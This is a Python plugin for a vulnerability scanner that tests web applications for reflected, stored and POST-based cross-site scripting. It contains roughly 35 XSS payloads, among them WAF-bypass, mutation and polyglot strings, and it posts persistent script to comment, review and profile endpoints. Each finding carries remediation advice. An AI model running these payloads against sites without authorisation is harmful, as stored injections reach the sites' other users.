"""
Advanced XSS Scanner
Comprehensive Cross-Site Scripting detection with:
- Reflected XSS (30+ payloads including WAF bypass, encoding, context-aware)
- Stored XSS (POST to input forms, verify on GET)
- Context-aware injection (HTML, attribute, JavaScript, URL contexts)
- WAF bypass techniques (encoding, case, tag breaking, event handlers)
- Polyglot payloads (work across multiple contexts)
"""
import asyncio
import re
import ssl
import urllib.parse

from app.scanner.plugins.base import Plugin, PluginMeta, PluginResult, Finding
from app.scanner.context import stable_fingerprint

META = PluginMeta(
    plugin_id="web.advanced_xss",
    name="Advanced XSS Scanner",
    category="web",
    depends_on=["fingerprint.http"],
    soft_depends_on=["owasp.web.scanner", "recon.directory.crawl"],
    consumes=["fingerprint.http", "net.open_ports", "recon.directories"],
    provides=["web.advanced_xss"],
    enabled_by_default=True,
    timeout_seconds=60.0,
)

_MARKER = "vSc4n_XSS_"  # Unique marker prefix for reflection detection

# ── Basic reflected XSS payloads ───────────────────────────────────────
_BASIC_PAYLOADS = [
    (f'<script>alert("{_MARKER}1")</script>', f'alert("{_MARKER}1")', "basic_script"),
    (f'<img src=x onerror=alert("{_MARKER}2")>', f'onerror=alert("{_MARKER}2")', "img_onerror"),
    (f'<svg/onload=alert("{_MARKER}3")>', f'onload=alert("{_MARKER}3")', "svg_onload"),
    (f'<body onload=alert("{_MARKER}4")>', f'onload=alert("{_MARKER}4")', "body_onload"),
    (f'<input onfocus=alert("{_MARKER}5") autofocus>', f'onfocus=alert("{_MARKER}5")', "input_autofocus"),
    (f'<details open ontoggle=alert("{_MARKER}6")>', f'ontoggle=alert("{_MARKER}6")', "details_ontoggle"),
    (f'<video src=x onerror=alert("{_MARKER}7")>', f'onerror=alert("{_MARKER}7")', "video_onerror"),
    (f'<audio src=x onerror=alert("{_MARKER}8")>', f'onerror=alert("{_MARKER}8")', "audio_onerror"),
]

# ── Context-aware payloads ─────────────────────────────────────────────
# When input is reflected inside an HTML attribute
_ATTR_BREAK_PAYLOADS = [
    (f'" onmouseover="alert(\'{_MARKER}a1\')', f"alert('{_MARKER}a1')", "attr_break_dquote"),
    (f"' onmouseover='alert(\"{_MARKER}a2\")", f'alert("{_MARKER}a2")', "attr_break_squote"),
    (f'" onfocus="alert(\'{_MARKER}a3\')" autofocus="', f"alert('{_MARKER}a3')", "attr_autofocus"),
    (f'"><img src=x onerror=alert("{_MARKER}a4")>', f'alert("{_MARKER}a4")', "attr_tag_break"),
    (f"'><img src=x onerror=alert('{_MARKER}a5')>", f"alert('{_MARKER}a5')", "attr_squote_break"),
]

# When input is reflected inside a JavaScript string
_JS_CONTEXT_PAYLOADS = [
    (f"';alert('{_MARKER}j1');//", f"alert('{_MARKER}j1')", "js_squote_break"),
    (f'";alert("{_MARKER}j2");//', f'alert("{_MARKER}j2")', "js_dquote_break"),
    (f"</script><script>alert('{_MARKER}j3')</script>", f"alert('{_MARKER}j3')", "js_tag_break"),
    (f"\\';alert('{_MARKER}j4');//", f"alert('{_MARKER}j4')", "js_escape_break"),
]

# When input is reflected in a URL/href attribute
_URL_CONTEXT_PAYLOADS = [
    (f"javascript:alert('{_MARKER}u1')", f"alert('{_MARKER}u1')", "javascript_uri"),
    (f"data:text/html,<script>alert('{_MARKER}u2')</script>", f"alert('{_MARKER}u2')", "data_uri"),
    (f"java%0ascript:alert('{_MARKER}u3')", f"alert('{_MARKER}u3')", "encoded_javascript"),
]

# ── WAF bypass payloads ────────────────────────────────────────────────
_BYPASS_PAYLOADS = [
    # Case variation
    (f'<ScRiPt>alert("{_MARKER}b1")</sCrIpT>', f'alert("{_MARKER}b1")', "case_variation"),
    # Double encoding
    (f'%3Cscript%3Ealert("{_MARKER}b2")%3C/script%3E', f'alert("{_MARKER}b2")', "url_encode"),
    # HTML entities
    (f'<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', "&#97;&#108;&#101;&#114;&#116;", "html_entities"),
    # No quotes
    (f'<img src=x onerror=alert({_MARKER}b4)>', f"alert({_MARKER}b4)", "no_quotes"),
    # Event handlers (less commonly filtered)
    (f'<marquee onstart=alert("{_MARKER}b5")>', f'alert("{_MARKER}b5")', "marquee_onstart"),
    (f'<isindex action=javascript:alert("{_MARKER}b6")>', f'alert("{_MARKER}b6")', "isindex_action"),
    (f'<math><mtext><table><mglyph><svg><mtext><textarea><path id=x style=animation-name:x onanimationstart=alert("{_MARKER}b7")>', f'alert("{_MARKER}b7")', "mutation_xss"),
    # SVG-based
    (f'<svg><animate onbegin=alert("{_MARKER}b8") attributeName=x dur=1s>', f'alert("{_MARKER}b8")', "svg_animate"),
    # Using eval and String.fromCharCode
    (f'<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', "eval(atob", "eval_base64"),
    # Template literal
    (f'<img src=x onerror=alert`{_MARKER}b10`>', f"alert`{_MARKER}b10`", "template_literal"),
    # Object/embed
    (f'<object data="data:text/html,<script>alert(\'{_MARKER}b11\')</script>">', f"alert('{_MARKER}b11')", "object_data"),
    # CSS-based (older browsers)
    (f'<div style="background:url(javascript:alert(\'{_MARKER}b12\'))">x</div>', f"alert('{_MARKER}b12')", "css_expression"),
]

# ── Polyglot payloads (work in multiple contexts) ──────────────────────
_POLYGLOT_PAYLOADS = [
    (
        f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(\"{_MARKER}p1\") )//",
        f'alert("{_MARKER}p1")',
        "polyglot_1",
    ),
    (
        f"'\"-->]]>*/</script></style></title></textarea><img src=x onerror=alert(\"{_MARKER}p2\")>",
        f'alert("{_MARKER}p2")',
        "polyglot_2",
    ),
    (
        f"'-alert(\"{_MARKER}p3\")-'",
        f'alert("{_MARKER}p3")',
        "polyglot_arithmetic",
    ),
]

# ── Stored XSS form targets ────────────────────────────────────────────
_STORED_XSS_TARGETS = [
    # (post_path, post_params, verify_path)
    ("/api/comments", {"body": None, "content": None}, "/comments"),
    ("/api/feedback", {"message": None, "feedback": None}, "/feedback"),
    ("/api/posts", {"title": None, "body": None, "content": None}, "/posts"),
    ("/api/messages", {"message": None, "text": None}, "/messages"),
    ("/api/reviews", {"review": None, "comment": None}, "/reviews"),
    ("/contact", {"name": None, "message": None, "email": None}, "/contact"),
    ("/register", {"username": None, "name": None, "bio": None}, "/profile"),
    ("/api/profile", {"bio": None, "name": None, "about": None}, "/api/profile"),
]

# ── Test endpoints for reflected XSS ───────────────────────────────────
_REFLECTED_ENDPOINTS = [
    "/search", "/api/search", "/q", "/find",
    "/error", "/404", "/page", "/redirect",
    "/api/v1/search", "/api/v1/query",
]
_REFLECTED_PARAMS = ["q", "search", "query", "keyword", "term", "s",
                     "name", "user", "input", "text", "msg", "error",
                     "redirect", "url", "page", "callback"]


import html as _html_mod

# HTML-encoded equivalents that indicate the payload was escaped (not executable)
_ENCODED_PATTERNS = [
    ("&lt;", "<"), ("&gt;", ">"), ("&quot;", '"'), ("&#x27;", "'"),
    ("&#39;", "'"), ("&amp;", "&"), ("&#x3c;", "<"), ("&#x3e;", ">"),
    ("&#60;", "<"), ("&#62;", ">"),
]


def _is_payload_escaped(body: str, payload: str, check_pattern: str) -> bool:
    """Return True if the payload appears HTML-encoded (not executable).

    Checks whether the response contains the escaped version of the payload
    rather than the raw executable version. If both exist, we look for the
    raw version NOT inside an HTML-encoded context.
    """
    # Find raw payload position
    raw_idx = body.find(check_pattern)
    if raw_idx < 0:
        return True  # Pattern not even found — nothing to exploit

    # Check surrounding context for HTML encoding
    # Look at the region around the match for encoded delimiters
    region_start = max(0, raw_idx - 50)
    region_end = min(len(body), raw_idx + len(check_pattern) + 50)
    region = body[region_start:region_end]

    # If the region contains HTML-encoded versions of < or > around our payload,
    # the framework is encoding output — this is not exploitable XSS
    escaped_payload = _html_mod.escape(payload)
    if escaped_payload in body and escaped_payload != payload:
        return True

    # Check if the payload appears inside an HTML comment or escaped attribute
    before = body[max(0, raw_idx - 200):raw_idx]
    if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
        return True  # Inside HTML comment

    return False


async def _http_request(host, port, method, path, body="",
                        content_type="application/x-www-form-urlencoded",
                        use_tls=False, timeout=8.0):
    """Send HTTP request, return (status, body_text, headers)."""
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)

        hdrs = {
            "Host": host, "User-Agent": "VulnScan/2.1",
            "Accept": "text/html,*/*", "Connection": "close",
        }
        if method == "POST":
            hdrs["Content-Type"] = content_type
            hdrs["Content-Length"] = str(len(body))

        req = f"{method} {path} HTTP/1.1\r\n"
        req += "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
        req += f"\r\n{body}"
        w.write(req.encode())
        await w.drain()
        resp = await asyncio.wait_for(r.read(65536), timeout=timeout)
        w.close()
        text = resp.decode("utf-8", errors="ignore")
        parts = text.split("\r\n\r\n", 1)
        hdr_block = parts[0] if parts else ""
        bdy = parts[1] if len(parts) > 1 else ""
        st = re.match(r"HTTP/\d\.\d\s+(\d+)", hdr_block)
        resp_headers = {}
        for line in hdr_block.split("\r\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                resp_headers[k.strip().lower()] = v.strip()
        return int(st.group(1)) if st else 0, bdy, resp_headers
    except Exception:
        return 0, "", {}


def _detect_context(body: str, marker: str) -> str:
    """Detect in which HTML context the marker/input is reflected."""
    # Find where marker appears in the response
    idx = body.find(marker)
    if idx < 0:
        return "none"

    # Look at surrounding context (100 chars before)
    before = body[max(0, idx - 100):idx].lower()

    # Inside a script tag
    if "<script" in before and "</script" not in before:
        return "javascript"
    # Inside an HTML attribute (look for opening quote)
    if re.search(r'(?:value|href|src|action|data|content)\s*=\s*["\'][^"\']*$', before):
        return "attribute"
    # Inside a URL
    if re.search(r'(?:href|src|action|url)\s*=\s*["\']', before):
        return "url"
    # Default: HTML body context
    return "html"


class Check(Plugin):
    async def run(self, target, ctx):
        ports = ctx.get("net.open_ports", []) or []
        http_data = (ctx.get("fingerprint.http", {}) or {}).get("http", [])
        target_raw = ctx.get("target_raw", target)
        directories = ctx.get("recon.directories", []) or []
        findings = []
        xss_results = []

        base_urls = []
        if re.match(r"^https?://", target_raw, re.I):
            base_urls.append(target_raw.rstrip("/"))
        else:
            for item in http_data:
                url = item.get("url", "")
                if url:
                    base_urls.append(url.rstrip("/"))
            if not base_urls:
                for p in [pp for pp in ports if pp in (80, 443, 8080, 8443)][:2]:
                    base_urls.append(f"{'https' if p in (443, 8443) else 'http'}://{target}:{p}")

        if not base_urls:
            return PluginResult(artifacts={"web.advanced_xss": []})

        for base in base_urls[:2]:
            parsed = urllib.parse.urlparse(base)
            host = parsed.hostname or target
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            tls = parsed.scheme == "https"

            test_paths = list(_REFLECTED_ENDPOINTS)
            for d in directories[:10]:
                if any(kw in d.lower() for kw in ["search", "query", "error", "page", "find"]):
                    test_paths.append(d)

            # ── Phase 1: Reflected XSS ─────────────────────────────────
            for endpoint in test_paths:
                for param in _REFLECTED_PARAMS[:8]:
                    # Step 1: Send unique marker to detect reflection
                    test_marker = f"{_MARKER}reflect_test"
                    test_path = f"{endpoint}?{param}={urllib.parse.quote(test_marker)}"
                    st, body, headers = await _http_request(host, port, "GET", test_path, use_tls=tls)

                    if st in (0, 404, 405) or test_marker not in body:
                        if st in (0, 404, 405):
                            break  # Endpoint doesn't exist
                        continue  # Param not reflected

                    # Pre-check: confirm reflection is input-dependent
                    # by verifying a different marker also reflects.
                    # Prevents false positives from static pages that
                    # coincidentally contain the first marker string.
                    alt_marker = f"{_MARKER}dyn_check"
                    alt_path = f"{endpoint}?{param}={urllib.parse.quote(alt_marker)}"
                    st_alt, body_alt, _ = await _http_request(host, port, "GET", alt_path, use_tls=tls)
                    if st_alt == 0 or alt_marker not in body_alt:
                        continue  # Reflection is not input-dependent

                    # Input IS reflected — detect context
                    context = _detect_context(body, test_marker)

                    # Check for XSS protections
                    csp = headers.get("content-security-policy", "")
                    x_xss = headers.get("x-xss-protection", "")
                    # CSP blocks inline scripts if script-src OR default-src is set without 'unsafe-inline'
                    has_csp_script = (
                        ("script-src" in csp or "default-src" in csp)
                        and "'unsafe-inline'" not in csp
                    )

                    # Step 2: Choose payloads based on context
                    if context == "javascript":
                        payloads = _JS_CONTEXT_PAYLOADS + _POLYGLOT_PAYLOADS
                    elif context == "attribute":
                        payloads = _ATTR_BREAK_PAYLOADS + _BASIC_PAYLOADS[:3]
                    elif context == "url":
                        payloads = _URL_CONTEXT_PAYLOADS + _BASIC_PAYLOADS[:3]
                    else:
                        payloads = _BASIC_PAYLOADS + _POLYGLOT_PAYLOADS

                    # Step 3: Test payloads
                    found_xss = False
                    for payload, check_pattern, desc in payloads:
                        inj_path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        st2, body2, _ = await _http_request(host, port, "GET", inj_path, use_tls=tls)

                        if st2 > 0 and check_pattern in body2 and not _is_payload_escaped(body2, payload, check_pattern):
                            fp = stable_fingerprint(target, META.plugin_id, "reflected", endpoint, param)
                            sev = "high"
                            if has_csp_script:
                                sev = "medium"  # CSP may prevent execution

                            findings.append(Finding(
                                severity=sev,
                                plugin_id=META.plugin_id,
                                title=f"Reflected XSS ({context} context): {endpoint}?{param}= [{desc}]",
                                description=(
                                    f"Reflected XSS confirmed in {context} context on {endpoint} via '{param}'. "
                                    f"Payload: {desc}. The injected script is reflected unencoded in the response."
                                    + (f" CSP header present but may not fully prevent execution." if has_csp_script else "")
                                ),
                                evidence=(
                                    f"url={base}{inj_path} param={param} context={context} "
                                    f"type=reflected technique={desc} csp={'yes' if has_csp_script else 'no'}"
                                ),
                                affected=target, fingerprint=fp, confidence=0.90,
                                remediation=(
                                    f"[{sev.upper()}] Reflected XSS at {endpoint}?{param}=\n"
                                    f"[CONTEXT] {context}\n\n"
                                    f"[FIX]\n"
                                    f"1. HTML-encode all user input in output: &lt; &gt; &quot; &#x27;\n"
                                    f"2. Use context-specific encoding:\n"
                                    f"   - HTML body: HTML entity encode\n"
                                    f"   - HTML attribute: attribute encode + quote attributes\n"
                                    f"   - JavaScript: JS string encode (\\x27, \\x22)\n"
                                    f"   - URL: URL encode (encodeURIComponent)\n"
                                    f"3. Implement Content-Security-Policy header\n"
                                    f"4. Use template engines with auto-escaping (React, Jinja2 |e)\n\n"
                                    f"[CSP EXAMPLE]\n"
                                    f"  Content-Security-Policy: default-src 'self'; script-src 'self'"
                                ),
                                references=[
                                    "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                                ],
                            ))
                            xss_results.append({"endpoint": endpoint, "param": param, "type": "reflected", "context": context, "technique": desc})
                            found_xss = True
                            break

                    # Step 4: Try WAF bypass if basic payloads failed
                    if not found_xss and test_marker in body:
                        for payload, check_pattern, desc in _BYPASS_PAYLOADS[:8]:
                            if "%" in payload:
                                inj_path = f"{endpoint}?{param}={payload}"
                            else:
                                inj_path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            st2, body2, _ = await _http_request(host, port, "GET", inj_path, use_tls=tls)
                            if st2 > 0 and check_pattern in body2 and not _is_payload_escaped(body2, payload, check_pattern):
                                fp = stable_fingerprint(target, META.plugin_id, "bypass", endpoint, param)
                                findings.append(Finding(
                                    severity="high",
                                    plugin_id=META.plugin_id,
                                    title=f"Reflected XSS (WAF bypass): {endpoint}?{param}= [{desc}]",
                                    description=(
                                        f"Reflected XSS detected via WAF bypass '{desc}' on {endpoint}. "
                                        f"Standard payloads were filtered but this bypass succeeded."
                                    ),
                                    evidence=f"url={base}{endpoint} param={param} type=reflected_bypass technique={desc}",
                                    affected=target, fingerprint=fp, confidence=0.85,
                                    remediation=(
                                        f"[HIGH] XSS via WAF bypass at {endpoint}?{param}=\n"
                                        f"[BYPASS] {desc}\n\n"
                                        f"[FIX] Fix the code — WAF is not sufficient. "
                                        f"Use context-aware output encoding at the application level."
                                    ),
                                    references=["https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"],
                                ))
                                xss_results.append({"endpoint": endpoint, "param": param, "type": "reflected_bypass", "technique": desc})
                                break

                    if any(r["endpoint"] == endpoint and r["param"] == param for r in xss_results):
                        continue  # Found XSS, try next param

            # ── Phase 2: Stored XSS ────────────────────────────────────
            for post_path, post_params, verify_path in _STORED_XSS_TARGETS:
                # Check if the POST endpoint exists
                st, _, _ = await _http_request(host, port, "GET", post_path, use_tls=tls)
                if st in (0, 404):
                    st, _, _ = await _http_request(host, port, "POST", post_path, body="{}", content_type="application/json", use_tls=tls)
                    if st in (0, 404):
                        continue

                # Try each parameter with a stored XSS payload
                stored_payload = f'<img src=x onerror=alert("{_MARKER}stored")>'
                stored_check = f'alert("{_MARKER}stored")'

                for param_name in post_params:
                    if param_name is None:
                        continue

                    # POST the payload
                    import json
                    post_body = json.dumps({param_name: stored_payload})
                    st_post, _, _ = await _http_request(
                        host, port, "POST", post_path, body=post_body,
                        content_type="application/json", use_tls=tls
                    )

                    if st_post in (0, 404, 405):
                        continue

                    # Verify: check if payload appears on the verify page
                    await asyncio.sleep(0.5)  # Small delay for storage
                    st_get, body_get, _ = await _http_request(
                        host, port, "GET", verify_path, use_tls=tls
                    )

                    if st_get == 200 and stored_check in body_get:
                        fp = stable_fingerprint(target, META.plugin_id, "stored", post_path, param_name)
                        findings.append(Finding(
                            severity="critical",
                            plugin_id=META.plugin_id,
                            title=f"Stored XSS: POST {post_path} ({param_name}) → visible at {verify_path}",
                            description=(
                                f"Stored (persistent) XSS confirmed. Payload injected via POST to "
                                f"{post_path} parameter '{param_name}' is rendered unencoded at {verify_path}. "
                                f"Any user visiting {verify_path} will execute the attacker's JavaScript."
                            ),
                            evidence=(
                                f"post_url={base}{post_path} param={param_name} "
                                f"verify_url={base}{verify_path} type=stored "
                                f"payload={stored_payload[:50]} reflected=true"
                            ),
                            affected=target, fingerprint=fp, confidence=0.95,
                            remediation=(
                                f"[CRITICAL] Stored XSS: POST {post_path} → renders at {verify_path}\n\n"
                                f"[FIX]\n"
                                f"1. HTML-encode ALL user-generated content before rendering\n"
                                f"2. Sanitize on INPUT: strip HTML tags from text fields\n"
                                f"3. Sanitize on OUTPUT: encode when rendering user content\n"
                                f"4. Use DOMPurify for client-side sanitization\n"
                                f"5. Implement strict Content-Security-Policy\n\n"
                                f"[NOTE] Stored XSS is more dangerous than reflected — it affects ALL users "
                                f"who view the page, not just users who click a crafted link."
                            ),
                            references=[
                                "https://portswigger.net/web-security/cross-site-scripting/stored",
                            ],
                        ))
                        xss_results.append({"type": "stored", "post_path": post_path, "param": param_name, "verify_path": verify_path})
                        break  # One stored XSS per endpoint is enough

            # ── Phase 3: POST-based reflected XSS ──────────────────────
            for endpoint in test_paths[:5]:
                for param in _REFLECTED_PARAMS[:5]:
                    test_marker = f"{_MARKER}post_test"
                    post_body = f"{param}={urllib.parse.quote(test_marker)}"
                    st, body, _ = await _http_request(
                        host, port, "POST", endpoint, body=post_body, use_tls=tls
                    )
                    if st in (0, 404, 405) or test_marker not in body:
                        continue

                    # Pre-check: confirm POST reflection is input-dependent
                    alt_marker = f"{_MARKER}post_dyn"
                    alt_body = f"{param}={urllib.parse.quote(alt_marker)}"
                    st_alt, body_alt, _ = await _http_request(
                        host, port, "POST", endpoint, body=alt_body, use_tls=tls
                    )
                    if st_alt == 0 or alt_marker not in body_alt:
                        continue  # Not genuinely reflected

                    # Reflected in POST — test payloads
                    for payload, check_pattern, desc in _BASIC_PAYLOADS[:4]:
                        post_body = f"{param}={urllib.parse.quote(payload)}"
                        st2, body2, _ = await _http_request(
                            host, port, "POST", endpoint, body=post_body, use_tls=tls
                        )
                        if st2 > 0 and check_pattern in body2 and not _is_payload_escaped(body2, payload, check_pattern):
                            fp = stable_fingerprint(target, META.plugin_id, "post_reflected", endpoint, param)
                            findings.append(Finding(
                                severity="high",
                                plugin_id=META.plugin_id,
                                title=f"Reflected XSS (POST): {endpoint} param={param} [{desc}]",
                                description=(
                                    f"POST-based reflected XSS on {endpoint} via '{param}'. "
                                    f"The server reflects POST parameters unencoded in the response."
                                ),
                                evidence=f"url={base}{endpoint} param={param} method=POST type=reflected technique={desc}",
                                affected=target, fingerprint=fp, confidence=0.90,
                                remediation=(
                                    f"[HIGH] POST-based reflected XSS at {endpoint}\n\n"
                                    f"[FIX] Encode all user input in output. See reflected XSS remediation above."
                                ),
                                references=["https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"],
                            ))
                            xss_results.append({"endpoint": endpoint, "param": param, "type": "post_reflected", "technique": desc})
                            break

        return PluginResult(findings=findings, artifacts={"web.advanced_xss": xss_results})
